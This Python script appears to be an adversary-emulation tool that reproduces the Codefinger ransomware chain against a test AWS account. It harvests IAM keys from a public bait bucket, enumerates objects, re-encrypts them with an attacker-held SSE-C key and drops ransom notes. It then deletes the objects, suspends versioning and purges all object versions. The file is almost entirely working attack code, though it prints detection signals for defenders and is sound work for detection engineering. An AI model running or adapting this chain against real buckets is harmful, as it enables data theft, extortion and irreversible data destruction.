"""
# FILE: attack.py

CODEFINGER -- Automated Post-Exploitation Attack Script
Executes a 5-phase, 6-step attack chain emulating the Codefinger ransomware group.

MITRE ATT&CK Techniques:
  T1078.004 - Valid Accounts: Cloud Accounts (Initial Access)
  T1530     - Data from Cloud Storage (Collection)
  T1486     - Data Encrypted for Impact (Impact - SIMULATED)
  T1485     - Data Destruction (Impact - SIMULATED)
  T1490     - Inhibit System Recovery (Impact)

Credential chain: anonymous S3 GetObject on bait bucket -> stolen IAM long-term key -> stolen_boto3_session
"""

import sys

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import os
import re
import time
import json
import random
import base64
import hashlib
import subprocess
from typing import Optional

import boto3
from botocore.exceptions import ClientError
from botocore.config import Config


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def print_phase(msg: str) -> None:
    print(f"\n{'='*60}")
    print(f"[PHASE] {msg}")
    print(f"{'='*60}")


def print_step(msg: str) -> None:
    print(f"\n[*] {msg}")


def print_ok(msg: str) -> None:
    print(f"[+] {msg}")


def print_err(msg: str) -> None:
    print(f"[-] {msg}")


def print_info(msg: str) -> None:
    print(f"    {msg}")


# ---------------------------------------------------------------------------
# Timing helpers
# ---------------------------------------------------------------------------

def op_delay(min_s: float = 2, max_s: float = 6) -> None:
    t = random.uniform(min_s, max_s)
    time.sleep(t)


def phase_delay() -> None:
    t = random.uniform(5, 15)
    print_info(f"Phase transition delay: {t:.1f}s")
    time.sleep(t)


# ---------------------------------------------------------------------------
# Pulumi output resolution
# ---------------------------------------------------------------------------

def get_pulumi_outputs(stack_dir: str) -> dict:
    """Run `pulumi stack output --json --show-secrets` and return parsed dict."""
    try:
        env = {**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")}
        result = subprocess.run(
            ["pulumi", "stack", "output", "--json", "--show-secrets"],
            cwd=stack_dir,
            capture_output=True,
            text=True,
            env=env,
            timeout=60,
        )
        if result.returncode != 0:
            print_err(f"pulumi stack output failed: {result.stderr.strip()}")
            return {}
        return json.loads(result.stdout)
    except Exception as exc:
        print_err(f"get_pulumi_outputs error: {exc}")
        return {}


# ---------------------------------------------------------------------------
# Boto3 session factory
# ---------------------------------------------------------------------------

def make_session(key_id: str, secret: str, region: str = "us-east-1") -> boto3.Session:
    return boto3.Session(
        aws_access_key_id=key_id,
        aws_secret_access_key=secret,
        region_name=region,
    )


def make_anon_client(service: str, region: str = "us-east-1"):
    """Create a boto3 client with no credentials for anonymous S3 access."""
    from botocore import UNSIGNED
    return boto3.client(
        service,
        region_name=region,
        config=Config(signature_version=UNSIGNED),
    )


# ---------------------------------------------------------------------------
# SSE-C key helpers
# ---------------------------------------------------------------------------

def generate_ssec_key() -> tuple:
    """Return (raw_bytes, base64_str, md5_base64_str) for an AES-256 SSE-C key."""
    raw = os.urandom(32)
    b64 = base64.b64encode(raw).decode("ascii")
    md5 = base64.b64encode(hashlib.md5(raw).digest()).decode("ascii")
    return raw, b64, md5


def save_ssec_key(raw: bytes, output_dir: str) -> str:
    """Write the SSE-C key to disk for cleanup use. Returns file path."""
    key_path = os.path.join(output_dir, "ssec_key.bin")
    with open(key_path, "wb") as fh:
        fh.write(raw)
    return key_path


# ---------------------------------------------------------------------------
# Phase 1 -- Initial Access: Credential Harvesting and Validation
# T1078.004 / T1552.001
# ---------------------------------------------------------------------------

def phase1_credential_harvest(
    bait_bucket_name: str,
    region: str = "us-east-1",
) -> tuple:
    """
    Anonymously retrieve the exposed terraform.tfvars credential file from the
    public bait S3 bucket (simulates T1552.001 discovery of IAM keys in IaC state).
    Returns (stolen_key_id, stolen_secret).
    """
    print_phase("Phase 1 - Initial Access: Credential Harvesting (T1078.004 / T1552.001)")

    # Step 1: Anonymous GetObject on bait bucket
    print_step(f"Step 1: Anonymously downloading terraform.tfvars from s3://{bait_bucket_name}")
    anon_s3 = make_anon_client("s3", region)
    try:
        response = anon_s3.get_object(Bucket=bait_bucket_name, Key="terraform.tfvars")
        body = response["Body"].read().decode("utf-8")
        print_ok(f"Retrieved terraform.tfvars ({len(body)} bytes) -- anonymous GetObject succeeded")
        print_info("CloudTrail event: GetObject on bait bucket (no AWS credential signature)")
    except ClientError as exc:
        code = exc.response["Error"]["Code"]
        print_err(f"Anonymous GetObject failed [{code}]: {exc}")
        raise SystemExit(1)

    op_delay(2, 5)

    # Parse credential file
    key_id_match = re.search(r'aws_access_key_id\s*=\s*"([^"]+)"', body)
    secret_match = re.search(r'aws_secret_access_key\s*=\s*"([^"]+)"', body)
    if not key_id_match or not secret_match:
        print_err("Failed to parse IAM credentials from terraform.tfvars")
        print_info(f"File content snippet: {body[:200]}")
        raise SystemExit(1)

    stolen_key_id = key_id_match.group(1)
    stolen_secret = secret_match.group(1)
    print_ok(f"Parsed stolen credentials -- key_id: {stolen_key_id[:8]}... (redacted)")

    # Step 2: Validate stolen credentials via GetCallerIdentity + ListBuckets
    print_step("Step 2: Validating stolen IAM credentials (T1078.004)")
    stolen_session = make_session(stolen_key_id, stolen_secret, region)

    sts = stolen_session.client("sts")
    try:
        identity = sts.get_caller_identity()
        print_ok(f"GetCallerIdentity -> Account: {identity['Account']}, ARN: {identity['Arn']}")
        print_info("CloudTrail event: GetCallerIdentity (high-fidelity attacker recon signal)")
    except ClientError as exc:
        print_err(f"GetCallerIdentity failed: {exc}")
        raise SystemExit(1)

    op_delay(1, 4)

    s3 = stolen_session.client("s3")
    try:
        buckets_resp = s3.list_buckets()
        bucket_names = [b["Name"] for b in buckets_resp.get("Buckets", [])]
        print_ok(f"ListBuckets -> {len(bucket_names)} bucket(s) visible: {bucket_names}")
        print_info("CloudTrail event: ListBuckets (Discovery:IAMUser/AnomalousBehavior trigger candidate)")
    except ClientError as exc:
        print_err(f"ListBuckets failed: {exc}")

    return stolen_key_id, stolen_secret, stolen_session


# ---------------------------------------------------------------------------
# Phase 2 -- Collection: Target S3 Object Enumeration
# T1530
# ---------------------------------------------------------------------------

def phase2_enumerate_objects(
    stolen_session: boto3.Session,
    target_bucket: str,
) -> list:
    """
    Paginate ListObjectsV2, collect metadata via HeadObject, sample-read one
    object per prefix to confirm data-plane access.
    Returns object_manifest: list of {'Key': str, 'Size': int} dicts.
    """
    print_phase("Phase 2 - Collection: Target S3 Object Enumeration (T1530)")
    print_step(f"Enumerating all objects in s3://{target_bucket}")

    s3 = stolen_session.client("s3")
    object_manifest = []

    # Paginated ListObjectsV2
    paginator = s3.get_paginator("list_objects_v2")
    try:
        for page in paginator.paginate(Bucket=target_bucket):
            for obj in page.get("Contents", []):
                object_manifest.append({"Key": obj["Key"], "Size": obj.get("Size", 0)})
                op_delay(0.1, 0.3)
        print_ok(f"ListObjectsV2 complete -- {len(object_manifest)} object(s) discovered")
        print_info("CloudTrail event: ListObjects")
    except ClientError as exc:
        print_err(f"ListObjectsV2 failed: {exc}")
        raise SystemExit(1)

    # HeadObject per discovered key
    print_step("Collecting per-object metadata via HeadObject")
    for obj in object_manifest:
        try:
            head = s3.head_object(Bucket=target_bucket, Key=obj["Key"])
            sse = head.get("ServerSideEncryption", "none")
            obj["SSE"] = sse
            print_info(f"  HeadObject {obj['Key']} -- size={obj['Size']} sse={sse}")
            print_info("  CloudTrail event: HeadObject")
        except ClientError as exc:
            print_err(f"HeadObject {obj['Key']} failed: {exc}")
        op_delay(1, 3)

    # Sample GetObject per unique prefix to confirm read access
    seen_prefixes = set()
    print_step("Sampling one object per prefix to confirm data-plane read access")
    for obj in object_manifest:
        prefix = obj["Key"].split("/")[0] if "/" in obj["Key"] else ""
        if prefix not in seen_prefixes:
            seen_prefixes.add(prefix)
            try:
                resp = s3.get_object(Bucket=target_bucket, Key=obj["Key"])
                content_sample = resp["Body"].read(128)
                print_ok(f"GetObject sample [{prefix}/] -- read {len(content_sample)} bytes -- read access confirmed")
                print_info("CloudTrail event: GetObject")
            except ClientError as exc:
                print_err(f"GetObject sample {obj['Key']} failed: {exc}")
            op_delay(1, 3)

    return object_manifest


# ---------------------------------------------------------------------------
# Phase 3 -- Impact: SSE-C Encryption (Simulated)
# T1486
# ---------------------------------------------------------------------------

def phase3_ssec_encrypt(
    stolen_session: boto3.Session,
    target_bucket: str,
    object_manifest: list,
    output_dir: str,
) -> tuple:
    """
    Generate a runtime AES-256 SSE-C key, re-upload each object with that key,
    then drop a ransom note in each discovered prefix.
    Returns (aes_key_raw, aes_key_b64, aes_key_md5, key_file_path).
    """
    print_phase("Phase 3 - Impact: SSE-C Encryption - SIMULATED (T1486)")
    print_info("SIMULATION NOTE: All data is synthetic test content generated by Pulumi.")
    print_info("AES-256 SSE-C key generated at runtime. Attacker retains sole decryption capability.")

    # Generate SSE-C key
    aes_key_raw, aes_key_b64, aes_key_md5 = generate_ssec_key()
    key_file_path = save_ssec_key(aes_key_raw, output_dir)
    print_ok(f"Generated AES-256 SSE-C key -> saved to {key_file_path}")
    print_info(f"Key MD5 (CloudTrail-visible HMAC): {aes_key_md5}")

    s3 = stolen_session.client("s3")
    encrypted_keys = []
    prefixes_seen = set()

    # Re-upload each object with SSE-C
    print_step("Re-encrypting objects with attacker SSE-C key (GetObject -> PutObject with SSE-C)")
    for obj in object_manifest:
        key = obj["Key"]
        # Skip ransom notes if already present from prior run
        if key.endswith("README.txt"):
            continue
        try:
            # Retrieve plaintext body
            get_resp = s3.get_object(Bucket=target_bucket, Key=key)
            body = get_resp["Body"].read()
            print_info(f"  GetObject {key} -> {len(body)} bytes retrieved")
        except ClientError as exc:
            print_err(f"  GetObject {key} failed: {exc}")
            continue

        op_delay(0.5, 1.5)

        try:
            # Re-upload with SSE-C -- overwrites plaintext original
            s3.put_object(
                Bucket=target_bucket,
                Key=key,
                Body=body,
                SSECustomerAlgorithm="AES256",
                SSECustomerKey=aes_key_b64,
                SSECustomerKeyMD5=aes_key_md5,
            )
            encrypted_keys.append(key)
            prefix = key.split("/")[0] if "/" in key else ""
            prefixes_seen.add(prefix)
            print_ok(f"  PutObject (SSE-C) {key} -- plaintext replaced with attacker-encrypted copy")
            print_info("  CloudTrail event: PutObject with x-amz-server-side-encryption-customer-algorithm header")
        except ClientError as exc:
            print_err(f"  PutObject (SSE-C) {key} failed: {exc}")

        op_delay(1, 3)

    # Drop ransom notes per prefix
    ransom_body = (
        "Your files have been encrypted with a key only we possess. "
        "Send payment to [Bitcoin address] within 7 days or your data will be permanently deleted. "
        "Contact: codefinger@proton.me"
    )
    print_step(f"Dropping ransom notes in {len(prefixes_seen)} prefix(es): {prefixes_seen}")
    for prefix in prefixes_seen:
        ransom_key = f"{prefix}/README.txt" if prefix else "README.txt"
        try:
            s3.put_object(
                Bucket=target_bucket,
                Key=ransom_key,
                Body=ransom_body.encode("utf-8"),
                ContentType="text/plain",
            )
            print_ok(f"  PutObject ransom note -> s3://{target_bucket}/{ransom_key}")
            print_info("  CloudTrail event: PutObject (README.txt IOC)")
        except ClientError as exc:
            print_err(f"  PutObject ransom note {ransom_key} failed: {exc}")
        op_delay(1, 2)

    return aes_key_raw, aes_key_b64, aes_key_md5, key_file_path


# ---------------------------------------------------------------------------
# Phase 4 -- Impact: Data Destruction (Simulated)
# T1485
# ---------------------------------------------------------------------------

def phase4_data_destruction(
    stolen_session: boto3.Session,
    target_bucket: str,
    object_manifest: list,
) -> None:
    """
    DeleteObject on each original key (now SSE-C overwritten -- deletes any remaining
    unversioned delete markers / ensures no plaintext restore path).
    Then set a 1-day lifecycle expiry and immediately remove it after CloudTrail capture.
    """
    print_phase("Phase 4 - Impact: Data Destruction - SIMULATED (T1485)")
    print_info("SIMULATION NOTE: Lifecycle rule applied then immediately removed to prevent actual auto-deletion.")

    s3 = stolen_session.client("s3")

    # DeleteObject per original key
    print_step("Deleting original object references (plaintext copies now SSE-C overwritten)")
    for obj in object_manifest:
        key = obj["Key"]
        if key.endswith("README.txt"):
            continue
        try:
            s3.delete_object(Bucket=target_bucket, Key=key)
            print_ok(f"  DeleteObject {key} -- original remove marker placed")
            print_info("  CloudTrail event: DeleteObject")
        except ClientError as exc:
            print_err(f"  DeleteObject {key} failed: {exc}")
        op_delay(1, 3)

    op_delay(2, 5)

    # Set 1-day lifecycle rule (Codefinger's 7-day TTL, shortened for safe emulation)
    print_step("Applying 1-day lifecycle auto-delete rule (T1485 -- simulating Codefinger 7-day TTL)")
    lifecycle_config = {
        "Rules": [
            {
                "ID": "codefinger-auto-delete",
                "Status": "Enabled",
                "Filter": {"Prefix": ""},
                "Expiration": {"Days": 1},
            }
        ]
    }
    try:
        s3.put_bucket_lifecycle_configuration(
            Bucket=target_bucket,
            LifecycleConfiguration=lifecycle_config,
        )
        print_ok("PutBucketLifecycleConfiguration -- 1-day expiry rule applied")
        print_info("CloudTrail event: PutBucketLifecycleConfiguration (high-signal control-plane change)")
        print_info("IOC: rule ID 'codefinger-auto-delete' matches known threat actor naming")
    except ClientError as exc:
        print_err(f"PutBucketLifecycleConfiguration failed: {exc}")

    op_delay(2, 4)

    # Immediately remove lifecycle rule (prevent actual auto-deletion of synthetic test data)
    print_step("Removing lifecycle rule immediately after CloudTrail capture (safe emulation)")
    try:
        s3.delete_bucket_lifecycle(Bucket=target_bucket)
        print_ok("DeleteBucketLifecycle -- rule removed; test data protected from automated deletion")
        print_info("CloudTrail event: DeleteBucketLifecycle")
    except ClientError as exc:
        print_err(f"DeleteBucketLifecycle failed: {exc}")


# ---------------------------------------------------------------------------
# Phase 5 -- Impact: Inhibit System Recovery
# T1490
# ---------------------------------------------------------------------------

def phase5_inhibit_recovery(
    stolen_session: boto3.Session,
    target_bucket: str,
) -> None:
    """
    Suspend S3 versioning, then bulk-delete all object versions and delete markers
    to foreclose version-rollback as an incident response path.
    """
    print_phase("Phase 5 - Impact: Inhibit System Recovery (T1490)")
    print_info("Suspending S3 versioning and purging all version history -- eliminates rollback path.")

    s3 = stolen_session.client("s3")

    # Read current versioning state
    print_step("Reading current bucket versioning state")
    try:
        versioning_resp = s3.get_bucket_versioning(Bucket=target_bucket)
        current_status = versioning_resp.get("Status", "Not set")
        print_ok(f"GetBucketVersioning -> current status: {current_status}")
    except ClientError as exc:
        print_err(f"GetBucketVersioning failed: {exc}")
        current_status = "Unknown"

    op_delay(2, 6)

    # Suspend versioning
    print_step("Suspending S3 versioning (PutBucketVersioning Status=Suspended)")
    try:
        s3.put_bucket_versioning(
            Bucket=target_bucket,
            VersioningConfiguration={"Status": "Suspended"},
        )
        print_ok("PutBucketVersioning -> Status=Suspended")
        print_info("CloudTrail event: PutBucketVersioning (critical high-fidelity detection signal)")
        print_info("Security Hub S3.14 control: versioning disabled alert")
    except ClientError as exc:
        print_err(f"PutBucketVersioning suspend failed: {exc}")

    op_delay(2, 5)

    # Collect all version entries and delete markers
    print_step("Paginating ListObjectVersions to collect all version IDs and delete markers")
    all_versions = []
    try:
        paginator = s3.get_paginator("list_object_versions")
        for page in paginator.paginate(Bucket=target_bucket):
            for v in page.get("Versions", []):
                all_versions.append({"Key": v["Key"], "VersionId": v["VersionId"]})
            for dm in page.get("DeleteMarkers", []):
                all_versions.append({"Key": dm["Key"], "VersionId": dm["VersionId"]})
            op_delay(0.2, 0.5)
        print_ok(f"ListObjectVersions -> {len(all_versions)} version entries (versions + delete markers)")
        print_info("CloudTrail event: ListObjectVersions")
    except ClientError as exc:
        print_err(f"ListObjectVersions failed: {exc}")

    if not all_versions:
        print_info("No version entries found -- bucket may have been unversioned. Skipping bulk delete.")
        return

    # Batch-delete all versions (max 1000 per DeleteObjects call)
    print_step(f"Bulk-deleting {len(all_versions)} version entries via DeleteObjects (batches of 1000)")
    batch_size = 1000
    for i in range(0, len(all_versions), batch_size):
        batch = all_versions[i : i + batch_size]
        try:
            delete_resp = s3.delete_objects(
                Bucket=target_bucket,
                Delete={"Objects": batch, "Quiet": True},
            )
            errors = delete_resp.get("Errors", [])
            deleted_count = len(batch) - len(errors)
            print_ok(f"  DeleteObjects batch {i//batch_size + 1}: {deleted_count}/{len(batch)} deleted")
            if errors:
                for err in errors[:5]:
                    print_err(f"    DeleteObjects error: {err['Key']} [{err['Code']}] {err['Message']}")
            print_info("  CloudTrail event: DeleteObjectVersion (eliminates all restore points)")
        except ClientError as exc:
            print_err(f"  DeleteObjects batch {i//batch_size + 1} failed: {exc}")
        op_delay(1, 3)

    print_ok("Phase 5 complete -- versioning suspended and all version history purged")
    print_info("IOC: PutBucketVersioning + bulk DeleteObjectVersion immediately after SSE-C PutObject activity")
    print_info("Complete Codefinger kill chain signature generated in single IAM session")


# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

def print_summary(target_bucket: str, object_manifest: list, key_file_path: str) -> None:
    print_phase("Attack Chain Summary")
    print_info("CloudTrail events generated:")
    print_info("  Phase 1 (T1078.004 / T1552.001):")
    print_info("    - GetObject          [bait bucket, anonymous, no signature]")
    print_info("    - GetCallerIdentity  [stolen IAM key -- recon signal]")
    print_info("    - ListBuckets        [stolen IAM key]")
    print_info("  Phase 2 (T1530):")
    print_info("    - ListObjects        [target bucket]")
    print_info("    - HeadObject         [per object]")
    print_info("    - GetObject          [sample per prefix]")
    print_info("  Phase 3 (T1486 - SIMULATED):")
    print_info("    - GetObject          [per synthetic object -- retrieve plaintext]")
    print_info("    - PutObject (SSE-C)  [per synthetic object -- attacker-encrypted re-upload]")
    print_info("    - PutObject          [README.txt ransom notes per prefix]")
    print_info("  Phase 4 (T1485 - SIMULATED):")
    print_info("    - DeleteObject       [per original key]")
    print_info("    - PutBucketLifecycleConfiguration [codefinger-auto-delete 1-day rule]")
    print_info("    - DeleteBucketLifecycle [immediately removed -- test data protected]")
    print_info("  Phase 5 (T1490):")
    print_info("    - GetBucketVersioning")
    print_info("    - PutBucketVersioning  [Suspended -- critical detection signal]")
    print_info("    - ListObjectVersions")
    print_info("    - DeleteObjects        [bulk version purge]")
    print()
    print_info(f"Target bucket: {target_bucket}")
    print_info(f"Objects encrypted: {len([o for o in object_manifest if not o['Key'].endswith('README.txt')])}")
    print_info(f"SSE-C key saved to: {key_file_path}")
    print()
    print_info("Cleanup required (before pulumi destroy):")
    print_info("  1. Re-enable versioning: PutBucketVersioning Status=Enabled")
    print_info("  2. Delete SSE-C encrypted objects (DeleteObject does not require the key)")
    print_info("  3. Delete ransom notes: finance/README.txt, hr/README.txt")
    print_info("  4. Verify lifecycle rule absent (deleted in-step during T1485)")
    print_info("  5. Securely delete ssec_key.bin from attack host")
    print_info("  6. pulumi destroy")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main(stack_dir: Optional[str] = None) -> None:
    if stack_dir is None:
        stack_dir = os.environ.get("PULUMI_STACK_DIR", "")
    if not stack_dir:
        # Auto-detect: infra/ is a sibling of emulation_scripts/
        script_dir = os.path.dirname(os.path.abspath(__file__))
        candidate = os.path.join(os.path.dirname(script_dir), "infra")
        stack_dir = candidate if os.path.isdir(candidate) else "."

    output_dir = os.path.dirname(os.path.abspath(__file__))

    print_step("Resolving infrastructure resource names from Pulumi stack outputs")
    infra = get_pulumi_outputs(stack_dir)

    # Resolve all resource names from Pulumi outputs -- NEVER hardcode AWS names
    bait_bucket_name = infra.get("bait_bucket_name", "") or os.environ.get("BAIT_BUCKET_NAME", "")
    target_bucket_name = infra.get("target_bucket_name", "") or os.environ.get("TARGET_BUCKET_NAME", "")
    region = infra.get("aws_region", "") or os.environ.get("AWS_DEFAULT_REGION", "us-east-1")

    # Victim IAM key -- from Pulumi outputs (--show-secrets reveals these) or env override
    victim_key_id = infra.get("victim_access_key_id", "") or os.environ.get("AWS_VICTIM_ACCESS_KEY_ID", "")
    victim_secret = infra.get("victim_secret_access_key", "") or os.environ.get("AWS_VICTIM_SECRET_ACCESS_KEY", "")

    print_info(f"bait_bucket_name:   {bait_bucket_name or '(not resolved -- will parse from tfvars)'}")
    print_info(f"target_bucket_name: {target_bucket_name}")
    print_info(f"region:             {region}")

    # Bait bucket name is required for phase 1; may come from Pulumi or env
    if not bait_bucket_name:
        bait_bucket_name = os.environ.get("BAIT_BUCKET_NAME", "")
    if not bait_bucket_name:
        print_err("BAIT_BUCKET_NAME not resolved from Pulumi outputs or environment.")
        print_err("Set BAIT_BUCKET_NAME env var or ensure Pulumi stack exports 'bait_bucket_name'.")
        raise SystemExit(1)

    if not target_bucket_name:
        print_err("target_bucket_name not resolved from Pulumi outputs or environment.")
        print_err("Set TARGET_BUCKET_NAME env var or ensure Pulumi stack exports 'target_bucket_name'.")
        raise SystemExit(1)

    # ---------------------------------------------------------------------------
    # Phase 1 -- Credential Harvest + Validation
    # ---------------------------------------------------------------------------
    stolen_key_id, stolen_secret, stolen_session = phase1_credential_harvest(
        bait_bucket_name=bait_bucket_name,
        region=region,
    )

    phase_delay()

    # ---------------------------------------------------------------------------
    # Phase 2 -- Target Enumeration
    # ---------------------------------------------------------------------------
    object_manifest = phase2_enumerate_objects(
        stolen_session=stolen_session,
        target_bucket=target_bucket_name,
    )

    if not object_manifest:
        print_err("Object manifest is empty -- no objects found in target bucket. Aborting.")
        raise SystemExit(1)

    phase_delay()

    # ---------------------------------------------------------------------------
    # Phase 3 -- SSE-C Encryption (Simulated)
    # ---------------------------------------------------------------------------
    aes_key_raw, aes_key_b64, aes_key_md5, key_file_path = phase3_ssec_encrypt(
        stolen_session=stolen_session,
        target_bucket=target_bucket_name,
        object_manifest=object_manifest,
        output_dir=output_dir,
    )

    phase_delay()

    # ---------------------------------------------------------------------------
    # Phase 4 -- Data Destruction (Simulated)
    # ---------------------------------------------------------------------------
    phase4_data_destruction(
        stolen_session=stolen_session,
        target_bucket=target_bucket_name,
        object_manifest=object_manifest,
    )

    phase_delay()

    # ---------------------------------------------------------------------------
    # Phase 5 -- Inhibit System Recovery
    # ---------------------------------------------------------------------------
    phase5_inhibit_recovery(
        stolen_session=stolen_session,
        target_bucket=target_bucket_name,
    )

    # ---------------------------------------------------------------------------
    # Summary
    # ---------------------------------------------------------------------------
    print_summary(target_bucket_name, object_manifest, key_file_path)


if __name__ == "__main__":
    stack_dir_arg = sys.argv[1] if len(sys.argv) > 1 else None
    main(stack_dir_arg)
